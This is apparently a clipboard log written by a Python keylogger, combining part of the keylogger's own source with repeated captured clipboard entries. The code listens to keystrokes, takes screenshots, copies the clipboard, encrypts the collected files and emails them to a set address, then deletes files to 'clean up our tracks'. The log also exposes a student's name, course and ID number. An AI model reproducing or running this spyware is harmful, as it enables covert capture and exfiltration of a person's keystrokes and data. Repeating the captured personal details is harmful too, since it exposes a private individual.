        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)Clipboard Data: 
computer_information()
filename = file_path + extend + "computer_information.txt"
send_email("computer_information.txt", filename, toaddr)
Clipboard Data: 
systeminfoClipboard Data: 
systeminfoClipboard Data: 
fromaddr, toaddr, textClipboard Data: 
fromaddr, toaddr, textClipboard Data: 
fromaddr, toaddr, textClipboard Data: 
fromaddr, toaddr, textClipboard Data: 
keylogger.pyClipboard Data: 
keylogger.pyClipboard Data: 
keylogger.pyClipboard Data: 
keylogger.pyClipboard Data: 
   if jump_size - 1 in last_jump.get(stones[j], set()) or jump_size in last_jump.get(stones[j], set()) or jump_size + 1 in last_jump.get(stones[j], set()):
                if stones[i] in last_jump:
                    last_jump[stones[i]].add(jump_size)
                else:
                    last_jump[stones[i]] = {jump_size}
    Clipboard Data: 
   if jump_size - 1 in last_jump.get(stones[j], set()) or jump_size in last_jump.get(stones[j], set()) or jump_size + 1 in last_jump.get(stones[j], set()):
                if stones[i] in last_jump:
                    last_jump[stones[i]].add(jump_size)
                else:
                    last_jump[stones[i]] = {jump_size}
    Clipboard Data: 
   if jump_size - 1 in last_jump.get(stones[j], set()) or jump_size in last_jump.get(stones[j], set()) or jump_size + 1 in last_jump.get(stones[j], set()):
                if stones[i] in last_jump:
                    last_jump[stones[i]].add(jump_size)
                else:
                    last_jump[stones[i]] = {jump_size}
    Clipboard Data: 
NIST digital signature scheme.Clipboard Data: 
NIST digital signature scheme.Clipboard Data: 
NIST digital signature scheme.Clipboard Data: 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Encrypt Files ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Clean up our tracks and delete filesClipboard Data: 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Encrypt Files ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Clean up our tracks and delete filesClipboard Data: 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Encrypt Files ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Clean up our tracks and delete filesClipboard Data: 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Encrypt Files ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Clean up our tracks and delete filesClipboard Data: 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Encrypt Files ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Clean up our tracks and delete filesClipboard could be not be copiedClipboard could be not be copiedClipboard could be not be copiedClipboard Data: 
Software Engineering Lab(305L)
Thadimarri Sameer
AP20110010028
CSE-AClipboard Data: 
Software Engineering Lab(305L)
Thadimarri Sameer
AP20110010028
CSE-AClipboard Data: 
Software Engineering Lab(305L)
Thadimarri Sameer
AP20110010028
CSE-AClipboard Data: 
number_of_iterations_endClipboard Data: 
number_of_iterations_endClipboard Data: 
number_of_iterations_end